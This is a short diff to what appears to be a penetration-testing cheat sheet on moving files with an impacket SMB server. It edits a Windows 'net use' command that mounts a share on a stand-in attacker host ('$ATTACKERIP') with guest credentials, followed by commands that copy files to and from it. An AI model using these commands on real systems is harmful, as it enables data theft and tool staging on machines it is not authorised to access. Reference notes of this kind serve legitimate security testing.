@@ -10,7 +10,7 @@ impacket-smbserver share -smb2support share -user guest -password guest
 
 On Windows :
 ```
-net use n: \\IP\share /user:fred fred
+net use n: \\$ATTACKERIP\share /user:guest guest
 copy n:\filename .
 copy filename n:\
 ```
